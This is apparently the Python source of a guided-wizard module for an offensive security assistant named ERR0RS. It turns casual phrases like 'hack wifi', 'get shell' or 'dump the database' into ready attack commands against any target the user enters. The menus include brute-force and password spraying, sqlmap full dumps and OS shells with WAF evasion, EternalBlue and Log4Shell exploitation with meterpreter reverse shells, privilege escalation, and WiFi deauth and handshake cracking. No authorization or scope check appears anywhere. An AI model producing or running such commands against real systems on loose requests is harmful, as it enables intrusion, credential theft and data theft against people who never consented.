#!/usr/bin/env python3
"""
ERR0RS ULTIMATE — Smart Guided Wizard v1.0
Intercepts vague/tool-only commands and returns interactive option menus.

Instead of running blind or doing nothing, ERR0RS asks smart questions:
  "scan for open ports"    → Shows nmap mode options + asks for target
  "open sqlmap"            → Asks objective: dump DBs? test injection? get shell?
  "brute force"            → Which service? SSH / FTP / RDP / HTTP?
  "crack this hash"        → What type? paste hash → pick mode
  "run metasploit"         → What's the goal? EternalBlue? Reverse shell? Search exploits?

Each wizard returns a WizardState dict with:
  {
    "type":    "wizard",
    "tool":    "nmap",
    "title":   "What kind of scan?",
    "speech":  "ERR0RS speech bubble text",
    "options": [
      { "label": "Quick Scan", "desc": "Top 100 ports, fast", "cmd": "nmap -F {target}" },
      ...
    ],
    "needs_target": True,   # if True, UI shows target input first
    "target_hint":  "IP, CIDR, or hostname",
  }

The UI renders this as a clickable menu. User picks → sends final command.

Author: Gary Holden Schneider (Eros) | GitHub: Gnosisone
"""

import re
from typing import Optional

# ─────────────────────────────────────────────────────────────────────────────
# WIZARD DEFINITIONS
# Each entry: trigger_pattern → wizard config
# ─────────────────────────────────────────────────────────────────────────────

WIZARDS = {

  # ══════════════════════════════════════════════════════════════════════════
  # NMAP
  # ══════════════════════════════════════════════════════════════════════════
  "nmap": {
    "tool":    "nmap",
    "title":   "🌐 NMAP — What kind of scan?",
    "speech":  "I can run several scan types. Pick your objective and I'll build the perfect command.",
    "needs_target": True,
    "target_hint":  "IP address, CIDR range, or hostname",
    "options": [
      {
        "label": "⚡ Quick Scan",
        "desc":  "Top 100 ports — fast overview. Best starting point.",
        "cmd":   "nmap -F {target}",
        "teach": "Fast scan hits the 100 most common ports. Great for rapid host profiling."
      },
      {
        "label": "🔍 Full Service Scan",
        "desc":  "Top 1000 ports + service versions. Standard pentest scan.",
        "cmd":   "nmap -sV -sC --top-ports 1000 {target}",
        "teach": "-sV detects service versions. -sC runs default scripts (vuln checks, auth grabs)."
      },
      {
        "label": "🌑 Stealth SYN Scan",
        "desc":  "Half-open TCP SYN scan. Quieter — doesn't complete the handshake.",
        "cmd":   "nmap -sS -p- --min-rate 3000 {target}",
        "teach": "SYN scan never completes TCP handshakes, making it harder to log than a full connect scan."
      },
      {
        "label": "💀 Aggressive Full Recon",
        "desc":  "All 65535 ports + OS + version + scripts. Loud but complete.",
        "cmd":   "nmap -A -p- --min-rate 5000 {target}",
        "teach": "-A enables OS detection, version detection, script scanning, and traceroute. Most complete scan."
      },
      {
        "label": "🔥 Vuln Script Scan",
        "desc":  "Runs NSE vulnerability scripts against common ports.",
        "cmd":   "nmap --script vuln -sV {target}",
        "teach": "NSE vuln scripts check for known CVEs, misconfigs, and exploitable services automatically."
      },
      {
        "label": "📡 UDP Scan",
        "desc":  "Scans top UDP ports. Finds DNS, SNMP, TFTP often missed by TCP scans.",
        "cmd":   "nmap -sU --top-ports 200 {target}",
        "teach": "UDP is slow but critical. DNS (53), SNMP (161), TFTP (69) are common UDP attack vectors."
      },
      {
        "label": "🏃 Ping Sweep (Network Map)",
        "desc":  "Discover all live hosts on a subnet. No port scan.",
        "cmd":   "nmap -sn {target}",
        "teach": "Ping sweep maps which hosts are alive before you port scan. Use CIDR like 192.168.1.0/24."
      },
    ]
  },

  # ══════════════════════════════════════════════════════════════════════════
  # SQLMAP
  # ══════════════════════════════════════════════════════════════════════════
  "sqlmap": {
    "tool":    "sqlmap",
    "title":   "🗄️ SQLMAP — What's the objective?",
    "speech":  "SQLMap can do a lot. Tell me what you're after and I'll configure the right attack.",
    "needs_target": True,
    "target_hint":  "Full URL with parameter — e.g. http://target.com/page?id=1",
    "options": [
      {
        "label": "🔍 Detect Injection Points",
        "desc":  "Test if the URL is vulnerable. No data extracted yet.",
        "cmd":   "sqlmap -u '{target}' --batch --level=1 --risk=1",
        "teach": "First step: confirm injection exists before going deeper. --batch auto-answers prompts."
      },
      {
        "label": "📋 List All Databases",
        "desc":  "Enumerate all database names on the server.",
        "cmd":   "sqlmap -u '{target}' --batch --dbs",
        "teach": "--dbs lists all databases. Pick one and use -D dbname --tables next."
      },
      {
        "label": "📊 Dump a Specific Table",
        "desc":  "Extract all rows from a target table (e.g. users, accounts).",
        "cmd":   "sqlmap -u '{target}' --batch -D target_db -T users --dump",
        "teach": "Change target_db and users to your actual database and table names from --dbs output."
      },
      {
        "label": "💣 Full Database Dump",
        "desc":  "Extract everything from all databases. Takes time but thorough.",
        "cmd":   "sqlmap -u '{target}' --batch --dump-all",
        "teach": "--dump-all grabs every table in every database. Can be slow on large DBs."
      },
      {
        "label": "🖥️ OS Shell (if privileged)",
        "desc":  "Attempt to get an OS-level shell via SQL injection.",
        "cmd":   "sqlmap -u '{target}' --batch --os-shell",
        "teach": "Requires FILE privilege (MySQL) or xp_cmdshell (MSSQL). High-value finding if it works."
      },
      {
        "label": "🛡️ WAF Bypass Mode",
        "desc":  "Use tamper scripts to evade Web Application Firewalls.",
        "cmd":   "sqlmap -u '{target}' --batch --dbs --tamper=space2comment,between --level=3 --risk=2",
        "teach": "Tamper scripts obfuscate payloads. space2comment replaces spaces with /**/, evading many WAFs."
      },
      {
        "label": "🍪 Test With Cookies (Auth Session)",
        "desc":  "Test authenticated pages by providing your session cookie.",
        "cmd":   "sqlmap -u '{target}' --batch --dbs --cookie='PHPSESSID=REPLACE_ME'",
        "teach": "Grab your session cookie from Burp Suite or browser DevTools → Network tab."
      },
    ]
  },

  # ══════════════════════════════════════════════════════════════════════════
  # HYDRA
  # ══════════════════════════════════════════════════════════════════════════
  "hydra": {
    "tool":    "hydra",
    "title":   "🔑 HYDRA — Which service to attack?",
    "speech":  "Brute force time. What login service are we going after?",
    "needs_target": True,
    "target_hint":  "IP address or hostname of target",
    "options": [
      {
        "label": "🔒 SSH",
        "desc":  "Brute force SSH login (port 22). Most common.",
        "cmd":   "hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 ssh://{target}",
        "teach": "-t 4 keeps threads low for SSH — too many threads = lockout or ban. rockyou.txt has 14M passwords."
      },
      {
        "label": "📁 FTP",
        "desc":  "Brute force FTP login. Often has anonymous or weak creds.",
        "cmd":   "hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://{target}",
        "teach": "Try anonymous:anonymous first manually before brute forcing FTP — often left open."
      },
      {
        "label": "🖥️ RDP (Windows)",
        "desc":  "Brute force Remote Desktop Protocol.",
        "cmd":   "hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://{target}",
        "teach": "RDP brute force is loud. Consider BlueKeep (CVE-2019-0708) as an alternative."
      },
      {
        "label": "📂 SMB (Windows shares)",
        "desc":  "Brute force SMB/Windows file sharing authentication.",
        "cmd":   "hydra -l administrator -P /usr/share/wordlists/rockyou.txt smb://{target}",
        "teach": "SMB auth — try null sessions with smbclient -L //{target} -N first before bruting."
      },
      {
        "label": "🌐 HTTP Login Form",
        "desc":  "Brute force a web application login form.",
        "cmd":   "hydra -l admin -P /usr/share/wordlists/rockyou.txt {target} http-post-form '/login:username=^USER^&password=^PASS^:Invalid credentials'",
        "teach": "Capture the login form request in Burp Suite first. Replace /login and field names with actuals."
      },
      {
        "label": "🗄️ MySQL Database",
        "desc":  "Brute force MySQL server authentication.",
        "cmd":   "hydra -l root -P /usr/share/wordlists/rockyou.txt mysql://{target}",
        "teach": "MySQL root with empty password is surprisingly common. Test manually first: mysql -h {target} -u root"
      },
      {
        "label": "📋 User List + Password Spray",
        "desc":  "Try a list of usernames against a common password. Low and slow.",
        "cmd":   "hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -p Password123 -t 1 ssh://{target}",
        "teach": "Password spray: one password, many users. Avoids lockout policies better than full bruteforce."
      },
    ]
  },

  # ══════════════════════════════════════════════════════════════════════════
  # GOBUSTER
  # ══════════════════════════════════════════════════════════════════════════
  "gobuster": {
    "tool":    "gobuster",
    "title":   "📂 GOBUSTER — What are we looking for?",
    "speech":  "Directory busting time. What's the target and what are we hunting?",
    "needs_target": True,
    "target_hint":  "Target URL — e.g. http://192.168.1.1",
    "options": [
      {
        "label": "📁 Common Directories",
        "desc":  "Fast scan for common web directories and files.",
        "cmd":   "gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt -t 30",
        "teach": "common.txt hits the most likely paths. Fast first pass before using larger wordlists."
      },
      {
        "label": "⚡ Medium Wordlist (Thorough)",
        "desc":  "Larger wordlist — finds more hidden paths. Takes longer.",
        "cmd":   "gobuster dir -u http://{target} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50",
        "teach": "Medium list has 220k entries. Good balance between coverage and speed."
      },
      {
        "label": "🔍 With Extensions (PHP/HTML/TXT)",
        "desc":  "Find specific file types — login pages, backups, config files.",
        "cmd":   "gobuster dir -u http://{target} -w /usr/share/wordlists/dirb/common.txt -x php,html,txt,bak,config -t 30",
        "teach": ".bak and .old files often contain source code or database credentials. Always include these."
      },
      {
        "label": "🌐 DNS Subdomain Enum",
        "desc":  "Find subdomains via DNS brute force.",
        "cmd":   "gobuster dns -d {target} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
        "teach": "DNS mode enumerates subdomains directly. Use target domain like example.com, not a URL."
      },
      {
        "label": "🏠 VHost Discovery",
        "desc":  "Find virtual hosts on a server (hidden web apps on same IP).",
        "cmd":   "gobuster vhost -u http://{target} -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
        "teach": "VHost mode sends Host: header variations. Different app might be hiding on same server."
      },
      {
        "label": "🔐 Hunt Admin Panels",
        "desc":  "Targeted wordlist focused on admin, login, and dashboard paths.",
        "cmd":   "gobuster dir -u http://{target} -w /usr/share/seclists/Discovery/Web-Content/AdminPanels.fuzz.txt -t 20",
        "teach": "Specifically targets admin/manager/dashboard/control panel paths. High-value findings."
      },
    ]
  },

  # ══════════════════════════════════════════════════════════════════════════
  # HASHCAT
  # ══════════════════════════════════════════════════════════════════════════
  "hashcat": {
    "tool":    "hashcat",
    "title":   "⚡ HASHCAT — What are we cracking?",
    "speech":  "Paste the hash and tell me what type it is — I'll fire up the right attack mode.",
    "needs_target": True,
    "target_hint":  "Paste the hash value here (e.g. 5f4dcc3b5aa765d61d8327deb882cf99)",
    "options": [
      {
        "label": "🔑 NTLM (Windows Password)",
        "desc":  "Crack Windows NTLM hashes from SAM/Active Directory.",
        "cmd":   "hashcat -m 1000 -a 0 {target} /usr/share/wordlists/rockyou.txt",
        "teach": "NTLM is the Windows password hash format. Cracks in seconds on a GPU with rockyou."
      },
      {
        "label": "🔓 MD5",
        "desc":  "Crack MD5 hashes (most common on older web apps and Linux).",
        "cmd":   "hashcat -m 0 -a 0 {target} /usr/share/wordlists/rockyou.txt",
        "teach": "MD5 is extremely fast to crack — billions of hashes/sec on modern GPU. Never use MD5 for passwords."
      },
      {
        "label": "🛡️ bcrypt (Slow/Hard)",
        "desc":  "Crack bcrypt hashes. Much slower — use targeted wordlists.",
        "cmd":   "hashcat -m 3200 -a 0 {target} /usr/share/wordlists/rockyou.txt",
        "teach": "bcrypt is intentionally slow. Expect ~100 hashes/sec vs billions for MD5. Focus on short/common passwords."
      },
      {
        "label": "📡 WPA2 WiFi Handshake",
        "desc":  "Crack a captured WPA2 4-way handshake (.hccapx or .pcap).",
        "cmd":   "hashcat -m 22000 -a 0 {target} /usr/share/wordlists/rockyou.txt",
        "teach": "Capture the handshake with aircrack-ng first. Use hashcat -m 22000 for modern WPA2 format."
      },
      {
        "label": "🎯 With Rules (Better Coverage)",
        "desc":  "Apply mutation rules to wordlist — adds numbers, caps, symbols.",
        "cmd":   "hashcat -m 0 -a 0 {target} /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule",
        "teach": "Rules transform words: password → Password1, p@ssword, passw0rd etc. Massively improves hit rate."
      },
      {
        "label": "🎲 Mask Attack (Brute Force Pattern)",
        "desc":  "Brute force with a known pattern — e.g. Company2024!",
        "cmd":   "hashcat -m 0 -a 3 {target} ?u?l?l?l?l?d?d?d?d!",
        "teach": "?u=uppercase, ?l=lowercase, ?d=digit, ?s=symbol. Use when you know the password pattern."
      },
    ]
  },

  # ══════════════════════════════════════════════════════════════════════════
  # METASPLOIT
  # ══════════════════════════════════════════════════════════════════════════
  "metasploit": {
    "tool":    "metasploit",
    "title":   "💣 METASPLOIT — What's the mission?",
    "speech":  "The exploit framework is ready. Tell me the goal and I'll set it up.",
    "needs_target": True,
    "target_hint":  "Target IP address",
    "options": [
      {
        "label": "🔍 Search & Scan First",
        "desc":  "Run auxiliary scanner to confirm vulnerability before exploiting.",
        "cmd":   "msfconsole -q -x 'use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS {target}; run; exit'",
        "teach": "ALWAYS confirm the vuln exists before attempting exploitation. Reduces noise and failed attempts."
      },
      {
        "label": "💥 EternalBlue (MS17-010)",
        "desc":  "SMB exploit — works on unpatched Windows 7/Server 2008. Most famous exploit.",
        "cmd":   "msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {target}; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST eth0; run'",
        "teach": "EternalBlue targets SMB port 445. Unpatched Windows = SYSTEM shell. Released by Shadow Brokers in 2017."
      },
      {
        "label": "🖥️ Reverse Shell (Meterpreter)",
        "desc":  "Set up a Meterpreter reverse shell listener on your machine.",
        "cmd":   "msfconsole -q -x 'use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST eth0; set LPORT 4444; run'",
        "teach": "Multi/handler catches reverse shells. Run this BEFORE executing your payload on the target."
      },
      {
        "label": "🔎 Search Exploits for Target",
        "desc":  "Search MSF database for exploits matching a service or CVE.",
        "cmd":   "msfconsole -q -x 'search type:exploit platform:windows; exit'",
        "teach": "Combine with Nmap -sV output: search the service name + version in MSF to find matching exploits."
      },
      {
        "label": "🌐 Web App Exploit",
        "desc":  "Launch web-based exploit (e.g. Log4Shell, PHP, Apache).",
        "cmd":   "msfconsole -q -x 'search log4j; use 0; set RHOSTS {target}; set LHOST eth0; run'",
        "teach": "Log4Shell (CVE-2021-44228) affected millions of Java apps. Check target's tech stack first with Nikto."
      },
      {
        "label": "⬆️ Post-Exploit: Privilege Escalate",
        "desc":  "After getting a shell, find local privilege escalation paths.",
        "cmd":   "msfconsole -q -x 'sessions -i 1; run post/multi/recon/local_exploit_suggester'",
        "teach": "local_exploit_suggester checks your current session's OS and patches to suggest privesc exploits."
      },
    ]
  },

  # ══════════════════════════════════════════════════════════════════════════
  # NIKTO
  # ══════════════════════════════════════════════════════════════════════════
  "nikto": {
    "tool":    "nikto",
    "title":   "🕷️ NIKTO — Web scan type?",
    "speech":  "Web server scanner ready. What are we looking for?",
    "needs_target": True,
    "target_hint":  "Target URL or IP (e.g. http://192.168.1.1 or https://target.com)",
    "options": [
      {
        "label": "🔍 Standard Web Scan",
        "desc":  "Default Nikto scan — misconfigs, outdated software, dangerous files.",
        "cmd":   "nikto -h {target}",
        "teach": "Nikto checks 6700+ dangerous files, 1250+ outdated server versions. Loud but comprehensive."
      },
      {
        "label": "🔒 HTTPS Scan",
        "desc":  "Scan HTTPS target with SSL. Checks cert issues too.",
        "cmd":   "nikto -h {target} -ssl",
        "teach": "Use -ssl flag for HTTPS targets. Nikto also checks for weak SSL ciphers and cert misconfigs."
      },
      {
        "label": "💾 Save Full Report",
        "desc":  "Run scan and save results to HTML report file.",
        "cmd":   "nikto -h {target} -o /tmp/nikto_report.html -Format htm",
        "teach": "Save results for your pentest report. HTML format is easy to review and share."
      },
      {
        "label": "🕵️ Through Burp Proxy",
        "desc":  "Route Nikto through Burp Suite to capture all requests.",
        "cmd":   "nikto -h {target} -useproxy http://127.0.0.1:8080",
        "teach": "Routing through Burp lets you inspect every request Nikto makes. Great for learning."
      },
      {
        "label": "⚙️ Custom Port",
        "desc":  "Scan web app on a non-standard port (8080, 8443, 8888...).",
        "cmd":   "nikto -h {target} -p 8080",
        "teach": "Always check non-standard ports. Dev/staging servers on 8080/8443 often have less hardening."
      },
    ]
  },

  # ══════════════════════════════════════════════════════════════════════════
  # NUCLEI
  # ══════════════════════════════════════════════════════════════════════════
  "nuclei": {
    "tool":    "nuclei",
    "title":   "☢️ NUCLEI — What kind of vuln scan?",
    "speech":  "Nuclei template scanner ready. What's the objective?",
    "needs_target": True,
    "target_hint":  "Target URL (e.g. http://target.com) or domain",
    "options": [
      {
        "label": "🔥 Critical + High Only",
        "desc":  "Focus on the most dangerous vulnerabilities only. Fast, high signal.",
        "cmd":   "nuclei -u http://{target} -s critical,high",
        "teach": "Severity filtering cuts noise. Start with critical/high, then medium if nothing found."
      },
      {
        "label": "📋 Full CVE Scan",
        "desc":  "Run all CVE templates against the target.",
        "cmd":   "nuclei -u http://{target} -t cves/",
        "teach": "CVE templates check for specific known vulnerabilities. Updated daily by the community."
      },
      {
        "label": "🔓 Default Credentials Check",
        "desc":  "Test for default login credentials on admin panels.",
        "cmd":   "nuclei -u http://{target} -t default-logins/",
        "teach": "Thousands of devices ship with default creds. Nuclei has templates for hundreds of them."
      },
      {
        "label": "🚪 Exposed Admin Panels",
        "desc":  "Find exposed admin/management interfaces.",
        "cmd":   "nuclei -u http://{target} -t exposed-panels/",
        "teach": "Exposed admin panels without auth = immediate critical finding in any pentest report."
      },
      {
        "label": "🌐 Full Automated Recon",
        "desc":  "Run all templates — comprehensive scan. Takes time.",
        "cmd":   "nuclei -u http://{target} -s critical,high,medium -o /tmp/nuclei_results.txt",
        "teach": "Full scan can take a while but finds everything nuclei knows about. Save output for report."
      },
    ]
  },

  # ══════════════════════════════════════════════════════════════════════════
  # AIRCRACK / WIFI
  # ══════════════════════════════════════════════════════════════════════════
  "aircrack": {
    "tool":    "aircrack-ng",
    "title":   "📡 AIRCRACK — WiFi attack step?",
    "speech":  "Wireless attack toolkit loaded. Which phase of the WiFi attack are we on?",
    "needs_target": False,
    "target_hint":  "",
    "options": [
      {
        "label": "📡 Step 1: Enable Monitor Mode",
        "desc":  "Put wireless adapter into monitor mode to capture raw packets.",
        "cmd":   "airmon-ng start wlan0",
        "teach": "Monitor mode lets your card capture all WiFi traffic, not just packets addressed to it."
      },
      {
        "label": "👁️ Step 2: Scan for Networks",
        "desc":  "Discover all nearby WiFi access points and clients.",
        "cmd":   "airodump-ng wlan0mon",
        "teach": "Note the BSSID (AP MAC), channel, and connected clients for your target network."
      },
      {
        "label": "🎯 Step 3: Target & Capture Handshake",
        "desc":  "Lock onto specific AP and wait for/force a WPA2 handshake.",
        "cmd":   "airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w /tmp/capture wlan0mon",
        "teach": "Replace channel 6 and BSSID with your target's values from Step 2. Handshake saved to /tmp/capture."
      },
      {
        "label": "💥 Step 4: Deauth Attack (Force Reconnect)",
        "desc":  "Kick clients off the AP to force them to reconnect and reveal handshake.",
        "cmd":   "aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon",
        "teach": "Deauth forces clients to re-authenticate, generating a handshake. Replace BSSID with target AP."
      },
      {
        "label": "🔓 Step 5: Crack the Handshake",
        "desc":  "Dictionary attack the captured WPA2 handshake.",
        "cmd":   "aircrack-ng /tmp/capture-01.cap -w /usr/share/wordlists/rockyou.txt",
        "teach": "rockyou.txt has 14M passwords. For stronger passwords, use hashcat with GPU after converting the .cap."
      },
      {
        "label": "🔄 Cleanup: Stop Monitor Mode",
        "desc":  "Restore adapter to managed mode after the engagement.",
        "cmd":   "airmon-ng stop wlan0mon",
        "teach": "Always clean up monitor mode or your WiFi won't work normally. Run airmon-ng check kill first."
      },
    ]
  },

  # ══════════════════════════════════════════════════════════════════════════
  # SUBFINDER
  # ══════════════════════════════════════════════════════════════════════════
  "subfinder": {
    "tool":    "subfinder",
    "title":   "🌊 SUBFINDER — Subdomain recon scope?",
    "speech":  "Passive recon ready. How deep do you want to go on subdomain discovery?",
    "needs_target": True,
    "target_hint":  "Root domain only — e.g. target.com (no http://)",
    "options": [
      {
        "label": "⚡ Quick Passive Enum",
        "desc":  "Fast passive subdomain discovery using public sources.",
        "cmd":   "subfinder -d {target} -silent",
        "teach": "Passive recon = no direct contact with target. Uses CT logs, DNS databases, APIs."
      },
      {
        "label": "🔍 Full Source Scan",
        "desc":  "Use all available data sources for maximum coverage.",
        "cmd":   "subfinder -d {target} -all -o /tmp/subs.txt",
        "teach": "-all uses every source configured in subfinder. Add API keys to ~/.config/subfinder/ for more results."
      },
      {
        "label": "🌐 Find Live Web Servers",
        "desc":  "Find subdomains AND probe which ones have live web servers.",
        "cmd":   "subfinder -d {target} -silent | httpx -silent -o /tmp/live_subs.txt",
        "teach": "Pipe into httpx to filter only live hosts. Ready for Nuclei scanning next."
      },
      {
        "label": "⚡ Full Recon Pipeline",
        "desc":  "Subdomains → live hosts → auto vuln scan. Full automated recon.",
        "cmd":   "subfinder -d {target} -silent | httpx -silent | nuclei -s critical,high",
        "teach": "This pipeline: discover → filter live → scan vulns. One-liner automated recon chain."
      },
    ]
  },

  # ══════════════════════════════════════════════════════════════════════════
  # ENUM4LINUX / SMB
  # ══════════════════════════════════════════════════════════════════════════
  "enum4linux": {
    "tool":    "enum4linux",
    "title":   "🏴 SMB/WINDOWS ENUM — What to enumerate?",
    "speech":  "SMB enumeration tools ready. What intel are we pulling from this Windows/Samba host?",
    "needs_target": True,
    "target_hint":  "Target IP address of Windows/Samba host",
    "options": [
      {
        "label": "📋 Full Enum (Everything)",
        "desc":  "Run all enum4linux checks: users, shares, groups, policies, OS info.",
        "cmd":   "enum4linux -a {target}",
        "teach": "-a runs all checks. Null sessions on SMB can reveal users, shares, and domain info without creds."
      },
      {
        "label": "👥 User Enumeration Only",
        "desc":  "Pull list of all user accounts from the target.",
        "cmd":   "enum4linux -U {target}",
        "teach": "User list is gold — feed directly into Hydra for targeted brute force."
      },
      {
        "label": "📂 Share Enumeration",
        "desc":  "List all SMB shares — find accessible file shares.",
        "cmd":   "enum4linux -S {target}",
        "teach": "Look for non-standard shares. IPC$, ADMIN$, C$ are default. Custom shares may have sensitive files."
      },
      {
        "label": "🔌 CrackMapExec SMB Sweep",
        "desc":  "Fast SMB sweep + null session + version detection with CME.",
        "cmd":   "crackmapexec smb {target}",
        "teach": "CME is faster for quick SMB recon. Shows OS, domain, signing status, and confirms MS17-010 quickly."
      },
      {
        "label": "🔒 Check EternalBlue (MS17-010)",
        "desc":  "Test if target is vulnerable to the EternalBlue SMB exploit.",
        "cmd":   "nmap --script smb-vuln-ms17-010 -p 445 {target}",
        "teach": "If this returns VULNERABLE, the target is likely pwnable with Metasploit's ms17_010_eternalblue module."
      },
    ]
  },

}

# ─────────────────────────────────────────────────────────────────────────────
# TRIGGER PATTERNS
# Maps user input phrases → wizard key
# ─────────────────────────────────────────────────────────────────────────────

WIZARD_TRIGGERS: dict[str, str] = {
  # NMAP
  "scan for open ports":     "nmap",
  "scan open ports":         "nmap",
  "run a scan":              "nmap",
  "run nmap":                "nmap",
  "open nmap":               "nmap",
  "start nmap":              "nmap",
  "port scan":               "nmap",
  "network scan":            "nmap",
  "scan the network":        "nmap",
  "scan this host":          "nmap",
  "scan the host":           "nmap",
  "find open ports":         "nmap",
  "check for open ports":    "nmap",
  "what ports are open":     "nmap",
  "which ports are open":    "nmap",
  "map the network":         "nmap",
  "discover hosts":          "nmap",
  "host discovery":          "nmap",
  "nmap scan":               "nmap",

  # SQLMAP
  "open sqlmap":             "sqlmap",
  "run sqlmap":              "sqlmap",
  "start sqlmap":            "sqlmap",
  "sql injection":           "sqlmap",
  "test for sql":            "sqlmap",
  "test for injection":      "sqlmap",
  "check for sqli":          "sqlmap",
  "dump the database":       "sqlmap",
  "dump database":           "sqlmap",
  "extract database":        "sqlmap",
  "attack the database":     "sqlmap",
  "inject sql":              "sqlmap",

  # HYDRA
  "brute force":             "hydra",
  "brute-force":             "hydra",
  "open hydra":              "hydra",
  "run hydra":               "hydra",
  "start hydra":             "hydra",
  "crack the login":         "hydra",
  "crack login":             "hydra",
  "attack the login":        "hydra",
  "password attack":         "hydra",
  "credential attack":       "hydra",
  "dictionary attack":       "hydra",
  "force credentials":       "hydra",

  # GOBUSTER
  "directory scan":          "gobuster",
  "dir scan":                "gobuster",
  "find directories":        "gobuster",
  "find hidden":             "gobuster",
  "open gobuster":           "gobuster",
  "run gobuster":            "gobuster",
  "start gobuster":          "gobuster",
  "fuzz directories":        "gobuster",
  "enumerate directories":   "gobuster",
  "directory bruteforce":    "gobuster",
  "find admin panel":        "gobuster",
  "find login page":         "gobuster",
  "find hidden files":       "gobuster",

  # HASHCAT
  "crack this hash":         "hashcat",
  "crack the hash":          "hashcat",
  "crack hash":              "hashcat",
  "open hashcat":            "hashcat",
  "run hashcat":             "hashcat",
  "start hashcat":           "hashcat",
  "crack password":          "hashcat",
  "hash crack":              "hashcat",
  "crack ntlm":              "hashcat",
  "crack md5":               "hashcat",

  # METASPLOIT
  "open metasploit":         "metasploit",
  "run metasploit":          "metasploit",
  "start metasploit":        "metasploit",
  "open msf":                "metasploit",
  "launch exploit":          "metasploit",
  "run exploit":             "metasploit",
  "get shell":               "metasploit",
  "gain access":             "metasploit",
  "eternalblue":             "metasploit",
  "exploit the target":      "metasploit",

  # NIKTO
  "open nikto":              "nikto",
  "run nikto":               "nikto",
  "start nikto":             "nikto",
  "web scan":                "nikto",
  "scan the website":        "nikto",
  "scan the web server":     "nikto",
  "web server scan":         "nikto",
  "check the website":       "nikto",

  # NUCLEI
  "open nuclei":             "nuclei",
  "run nuclei":              "nuclei",
  "start nuclei":            "nuclei",
  "vuln scan":               "nuclei",
  "vulnerability scan":      "nuclei",
  "scan for vulnerabilities":"nuclei",
  "scan for cves":           "nuclei",
  "check for vulnerabilities":"nuclei",

  # AIRCRACK
  "crack wifi":              "aircrack",
  "hack wifi":               "aircrack",
  "crack wpa2":              "aircrack",
  "wifi attack":             "aircrack",
  "wireless attack":         "aircrack",
  "open aircrack":           "aircrack",
  "run aircrack":            "aircrack",
  "start aircrack":          "aircrack",
  "capture handshake":       "aircrack",
  "monitor mode":            "aircrack",
  "deauth attack":           "aircrack",

  # SUBFINDER
  "find subdomains":         "subfinder",
  "enumerate subdomains":    "subfinder",
  "subdomain scan":          "subfinder",
  "subdomain enum":          "subfinder",
  "open subfinder":          "subfinder",
  "run subfinder":           "subfinder",
  "passive recon":           "subfinder",
  "recon the domain":        "subfinder",

  # ENUM4LINUX / SMB
  "smb enum":                "enum4linux",
  "enumerate smb":           "enum4linux",
  "windows enum":            "enum4linux",
  "open enum4linux":         "enum4linux",
  "run enum4linux":          "enum4linux",
  "smb scan":                "enum4linux",
  "check smb":               "enum4linux",
  "list shares":             "enum4linux",
  "enumerate shares":        "enum4linux",
}


# ─────────────────────────────────────────────────────────────────────────────
# CORE FUNCTIONS
# ─────────────────────────────────────────────────────────────────────────────

def detect_wizard(text: str) -> Optional[str]:
    """
    Check if the input text should trigger a wizard.
    Returns wizard key string or None.

    Logic:
      1. Check WIZARD_TRIGGERS for direct phrase match
      2. Check if text is just a bare tool name (→ open its wizard)
      3. Check if text has a tool keyword but no target (→ wizard for that tool)
    """
    lower = re.sub(r'\s+', ' ', text.lower().strip())

    # 1. Direct trigger phrase match (longest wins)
    best = None
    best_len = 0
    for phrase, wizard_key in WIZARD_TRIGGERS.items():
        if phrase in lower and len(phrase) > best_len:
            best = wizard_key
            best_len = len(phrase)
    if best:
        return best

    # 2. Bare tool name only
    bare = lower.strip()
    if bare in WIZARDS:
        return bare

    # 3. Tool keyword present but no IP/URL/domain target detected
    # (user typed something like "run sqlmap" with no URL)
    ip_pattern = re.compile(r'\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}')
    url_pattern = re.compile(r'https?://|\.com|\.org|\.net|\.io|\.local|/\d')
    has_target = bool(ip_pattern.search(lower) or url_pattern.search(lower))

    if not has_target:
        for wizard_key in WIZARDS:
            if wizard_key in lower or (wizard_key == "aircrack" and "aircrack" in lower):
                return wizard_key

    return None


def get_wizard(tool: str) -> Optional[dict]:
    """Return the wizard config dict for a given tool key."""
    return WIZARDS.get(tool)


def build_wizard_response(tool: str) -> Optional[dict]:
    """
    Build a full wizard response dict ready to send to the UI.
    Returns None if no wizard exists for this tool.
    """
    wizard = WIZARDS.get(tool)
    if not wizard:
        return None

    return {
        "type":         "wizard",
        "tool":         wizard["tool"],
        "title":        wizard["title"],
        "speech":       wizard["speech"],
        "options":      wizard["options"],
        "needs_target": wizard.get("needs_target", True),
        "target_hint":  wizard.get("target_hint", "Enter target"),
    }


def apply_target(cmd: str, target: str) -> str:
    """Replace {target} placeholder in a command string."""
    return cmd.replace("{target}", target.strip())


def list_wizards() -> list[str]:
    """Return list of all tool names that have wizards."""
    return list(WIZARDS.keys())


# ─────────────────────────────────────────────────────────────────────────────
# SELF-TEST
# ─────────────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    tests = [
        "scan for open ports",
        "open sqlmap",
        "brute force",
        "crack this hash",
        "run metasploit",
        "find directories",
        "crack wifi",
        "vulnerability scan",
        "nmap",
        "hydra 192.168.1.1",     # should NOT trigger wizard (has target)
        "what ports are open",
        "smb enum",
        "passive recon",
        "enumerate subdomains",
        "run gobuster",
    ]
    print("[WIZARD] Self-test\n" + "="*55)
    for t in tests:
        w = detect_wizard(t)
        print(f"  [{w or '—':12}] ← '{t}'")
    print("="*55)
    print(f"\n[WIZARD] {len(WIZARDS)} wizards available: {', '.join(WIZARDS.keys())}")
    print(f"[WIZARD] {len(WIZARD_TRIGGERS)} trigger phrases registered")
